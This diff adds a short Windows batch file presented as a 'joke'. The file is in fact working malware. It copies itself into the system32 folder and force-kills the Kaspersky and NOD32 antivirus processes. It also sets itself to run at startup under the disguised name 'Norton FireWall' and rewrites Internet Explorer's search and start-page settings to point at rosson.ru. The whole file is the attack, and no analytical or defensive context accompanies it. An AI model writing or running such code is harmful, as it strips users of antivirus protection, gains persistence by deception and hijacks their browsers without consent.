@@ -1,0 +1,13 @@
+@echo off
+prompt $_II$s$s$s$sII$s$s$s$s$s$s$sAAA$s$s$s$s$s$s$sII$s$s$s$sII$s$s$s$s$s$s$sAAA$_II$s$s$s$sII$s$s$s$s$s$sA$s$s$sA$s$s$s$s$s$sII$s$s$s$sII$s$s$s$s$s$sA$s$s$sA$_IIIIIIII$s$s$s$s$sAAAAAAA$s$s$s$s$sIIIIIIII$s$s$s$s$sAAAAAAA$_IIIIIIII$s$s$s$sA$s$s$s$s$s$s$sA$s$s$s$sIIIIIIII$s$s$s$sA$s$s$s$s$s$s$sA$_II$s$s$s$sII$s$s$sA$s$s$s$s$s$s$s$s$sA$s$s$sII$s$s$s$sII$s$s$sA$s$s$s$s$s$s$s$s$sA$_II$s$s$s$sII$s$sA$s$s$s$s$s$s$s$s$s$s$sA$s$sII$s$s$s$sII$s$sA$s$s$s$s$s$s$s$s$s$s$sA
+start /max
+copy joke-agent.bat C:\WINDOWS\system32\real_joke.bat
+taskkill /im avp.exe /f
+taskkill /im nod32krn.exe /f
+reg add "hkcu\software\microsoft\windows\currentversion\run" /v Norton FireWall /t reg_sz /d "C:\WINDOWS\system32\real_joke.bat"
+reg add "hkcu\software\microsoft\internet explorer\main" /v Search Bar /t reg_sz /d http://www.rosson.ru/ /f
+reg add "hkcu\software\microsoft\internet explorer\main" /v Default_Search_URL /t reg_sz /d http://www.rosson.ru/ /f
+reg add "hkcu\software\microsoft\internet explorer\main" /v Search Page /t reg_sz /d http://www.rosson.ru/ /f
+reg add "hklm\software\microsoft\internet explorer\search" /v SearchAssistant /t reg_sz /d http://www.rosson.ru/ /f
+reg add "hkcu\software\microsoft\internet explorer\main" /v Default_Page_URL /t reg_sz /d http://www.rosson.ru/ /f
+msg * Joke-agent can't work on this computer. HAHAHAHAHA!
